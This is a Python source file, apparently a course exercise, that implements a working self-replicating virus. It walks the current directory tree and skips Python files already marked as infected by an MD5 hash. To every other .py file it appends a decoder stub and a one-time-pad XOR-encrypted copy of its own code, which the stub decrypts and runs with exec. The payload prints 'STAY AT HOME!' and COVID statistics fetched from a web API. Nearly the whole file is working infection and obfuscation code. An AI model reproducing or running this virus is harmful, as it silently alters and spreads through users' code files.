import os
import sys
import re
import requests
import base64
import string
import random
import hashlib


# Start Virus
# TODO: If virus is an encrypted form, it should decrypt itself first.
def str_xor_decode(s1, s2):
	charSet = string.printable
	result = ""
	for (c1, c2) in zip(s1, s2):
		xorResult = charSet.index(c1) ^ charSet.index(c2)
		result += charSet[xorResult]
	return result


# TODO: Virus should detect the .py files in the current directory and its subdirectories
# DONE!
def findAllPythonFiles(path):
	# all python files merged in this list at the end
	pythonFiles = []

	# take all files/folders in the current subdirectory
	allFiles = os.listdir(path)

	# if it contains our virus file, extract it from the list
	if 'e2169589.py' in allFiles:
		allFiles.remove('e2169589.py')

	for f in allFiles:
		# it is folder, recursively call this method again and add found python files
		if os.path.isdir(path+"/"+f):
			pythonFilesFromSubDir = findAllPythonFiles(path+"/"+f)
			pythonFiles.extend(pythonFilesFromSubDir)
		# if this file is a python file, add it to the pythonFiles
		isPythonFile = re.search(".py$", f)
		if isPythonFile:
			pythonFiles.append(path+"/"+f)
	return pythonFiles


# TODO: Virus should separate previously infected python files/uninfected python files

def excludeInfectedOnes(pyFiles):
	uninfectedPyFiles = []
	for f in pyFiles:
		isInfected = False
		startLine = 0
		endLine = 0
		openedFile = open(f, "r")
		lines = openedFile.readlines()
		for i in range(len(lines)):
			if lines[i] == "# Start Virus\n":
				startLine = i
			elif lines[i] == "exec(actualCode)\n":
				endLine = i
				break
		virusLines = lines[startLine:endLine+4]
		virusStr = "".join([str(ele) for ele in virusLines])
		virusStr = "\t" + "\n" + virusStr
		virusHash = hashlib.md5(virusStr.encode())
		if virusLines and (str('"""' + virusHash.hexdigest() + '"""') == lines[-1] or len(virusLines) == 30):
			print("Previously infected file found: " + f)
			isInfected = True
		if not isInfected:
			print(f + " is uninfected file, virus is now be infected :) ")
			uninfectedPyFiles.append(f)
	return uninfectedPyFiles



# TODO: Virus should encrypt its code by using one time pad
def encrypt():
	actualCode = """
def findAllPythonFiles(path):
	# all python files merged in this list at the end
	pythonFiles = []

	# take all files/folders in the current subdirectory
	allFiles = os.listdir(path)

	# if it contains our virus file, extract it from the list
	if 'e2169589.py' in allFiles:
		allFiles.remove('e2169589.py')

	for f in allFiles:
		# it is folder, recursively call this method again and add found python files
		if os.path.isdir(path+"/"+f):
			pythonFilesFromSubDir = findAllPythonFiles(path+"/"+f)
			pythonFiles.extend(pythonFilesFromSubDir)
		# if this file is a python file, add it to the pythonFiles
		isPythonFile = re.search(".py$", f)
		if isPythonFile:
			pythonFiles.append(path+"/"+f)
	return pythonFiles
	

def excludeInfectedOnes(pyFiles):
	uninfectedPyFiles = []
	for f in pyFiles:
		isInfected = False
		startLine = 0
		endLine = 0
		openedFile = open(f, "r")
		lines = openedFile.readlines()
		for i in range(len(lines)):
			if lines[i] == "# Start Virus\\n":
				startLine = i
			elif lines[i] == "exec(actualCode)\\n":
				endLine = i
				break
		virusLines = lines[startLine:endLine+4]
		virusStr = "".join([str(ele) for ele in virusLines])
		virusStr = "\\t" + "\\n" + virusStr
		virusHash = hashlib.md5(virusStr.encode())
		if virusLines and (str('\"\"\"' + virusHash.hexdigest() + '\"\"\"') == lines[-1] or len(virusLines) == 30):
			print("Previously infected file found: " + f)
			isInfected = True
		if not isInfected:
			print(f + " is uninfected file, virus is now be infected :) ")
			uninfectedPyFiles.append(f)
	return uninfectedPyFiles

def encrypt():
	charSet = string.printable
	encryptedCode = ""
	key = ""
	for c1 in actualCode:
		c1index = charSet.index(c1)
		c2 = random.randint(0, 92)
		while c1index ^ c2 > 92 or c2 == 85 or c1index ^ c2 == 85:
			c2 = random.randint(0, 92)
		xorResult = c1index ^ c2
		encryptedCode += charSet[xorResult]
		key += charSet[c2]
	return encryptedCode, key

def infect(pythonFiles):
	decodeFunction = \"\"\"
# Start Virus

import os
import sys
import re
import requests
import base64
import string
import random
import hashlib	

def str_xor_decode(s1, s2):
	charSet = string.printable
	result = ""
	for (c1, c2) in zip(s1, s2):
		xorResult = charSet.index(c1) ^ charSet.index(c2)
		result += charSet[xorResult]
	return result
	
thisFile = sys.argv[0]
thisFileOpened = open(thisFile, "r")
thisFileLines = thisFileOpened.readlines()
thisFileOpened.close()
keyLine = thisFileLines[-2]
codeLine = thisFileLines[-3]
actualCode = str_xor_decode(codeLine, keyLine)
exec(actualCode)
\"\"\"	
	for file in pythonFiles:
		encryptedCode, key = encrypt()
		f = open(file, 'a')
		f.write("\\n")
		f.write(decodeFunction)
		f.write("\\n")
		f.write('\"\"\"' + encryptedCode + '\"\"\"')
		f.write("\\n")
		f.write('\"\"\"' + key + '\"\"\"')
		f.write("\\n")
		wholeStr = "\\n" + decodeFunction + "\\n" + '\"\"\"' + encryptedCode + '\"\"\"' + "\\n" +'\"\"\"' + key + '\"\"\"' + "\\n"
		wholeHash = hashlib.md5(wholeStr.encode())
		f.write('\"\"\"' + wholeHash.hexdigest() + '\"\"\"')
		f.close()
		
		
def payload():
	print("STAY AT HOME!")
	coronaTable = requests.get("https://corona-stats.online?format=json").json()
	for country in coronaTable['data']:
		deathCount = country['deaths']
		confirmedCount = country['confirmed']
		todayCasesCount = country['todayCases']
		criticalCount = country['critical']
		todayDeathCount = country['todayDeaths']
		countryName = country['country']
		print("Country: {CountryName:<32} Confirmed Cases: {ConfirmedCount:<10} Total Deaths: {DeathCount:<10} "
			  "Today Cases: {TodayCasesCount:<6} Today Deaths: {TodayDeathCount:<6} Critical Cases: {CriticalCount:<6}"
			  .format(CountryName=countryName, ConfirmedCount=confirmedCount, DeathCount = deathCount,
					  TodayCasesCount = todayCasesCount, CriticalCount = criticalCount, TodayDeathCount = todayDeathCount))

pythonFilesInDirectory = findAllPythonFiles(os.path.abspath(""))
pythonFilesInDirectory = excludeInfectedOnes(pythonFilesInDirectory)
infect(pythonFilesInDirectory)
payload()
"""

	charSet = string.printable
	encryptedCode = ""
	key = ""
	for c1 in actualCode:
		c1index = charSet.index(c1)
		c2 = random.randint(0, 92)
		while c1index ^ c2 > 92 or c2 == 85 or c1index ^ c2 == 85:
			c2 = random.randint(0, 92)
		xorResult = c1index ^ c2
		encryptedCode += charSet[xorResult]
		key += charSet[c2]
	return encryptedCode, key


# TODO: Virus should append both the encrypted version of the code and one time pad key to be used in the decryption
def infect(pythonFiles):
	decodeFunction = """	
# Start Virus

import os
import sys
import re
import requests
import base64
import string
import random
import hashlib	

def str_xor_decode(s1, s2):
	charSet = string.printable
	result = ""
	for (c1, c2) in zip(s1, s2):
		xorResult = charSet.index(c1) ^ charSet.index(c2)
		result += charSet[xorResult]
	return result
	
thisFile = sys.argv[0]
thisFileOpened = open(thisFile, "r")
thisFileLines = thisFileOpened.readlines()
thisFileOpened.close()
keyLine = thisFileLines[-2]
codeLine = thisFileLines[-3]
actualCode = str_xor_decode(codeLine, keyLine)
exec(actualCode)
"""

	for file in pythonFiles:
		encryptedCode, key = encrypt()
		f = open(file, 'a')
		f.write("\n")
		f.write(decodeFunction)
		f.write("\n")
		f.write('"""' + encryptedCode + '"""')
		f.write("\n")
		f.write('"""' + key + '"""')
		f.write("\n")
		wholeStr = decodeFunction + "\n" + '"""' + encryptedCode + '"""' + "\n" +'"""' + key + '"""' + "\n"
		wholeHash = hashlib.md5(wholeStr.encode())
		f.write('"""' + wholeHash.hexdigest() + '"""')
		f.close()


# TODO: Execute paylaod of the virus
def payload():
	print("STAY AT HOME!")
	coronaTable = requests.get("https://corona-stats.online?format=json").json()
	for country in coronaTable['data']:
		deathCount = country['deaths']
		confirmedCount = country['confirmed']
		todayCasesCount = country['todayCases']
		criticalCount = country['critical']
		todayDeathCount = country['todayDeaths']
		countryName = country['country']
		print("Country: {CountryName:<32} Confirmed Cases: {ConfirmedCount:<10} Total Deaths: {DeathCount:<10} "
			  "Today Cases: {TodayCasesCount:<6} Today Deaths: {TodayDeathCount:<6} Critical Cases: {CriticalCount:<6}"
			  .format(CountryName=countryName, ConfirmedCount=confirmedCount, DeathCount = deathCount,
					  TodayCasesCount = todayCasesCount, CriticalCount = criticalCount, TodayDeathCount = todayDeathCount))


pythonFilesInDirectory = findAllPythonFiles(os.path.abspath(""))
print("All Files")
print(pythonFilesInDirectory)
pythonFilesInDirectory = excludeInfectedOnes(pythonFilesInDirectory)
print("Not Infected Yet")
print(pythonFilesInDirectory)

infect(pythonFilesInDirectory)
payload()

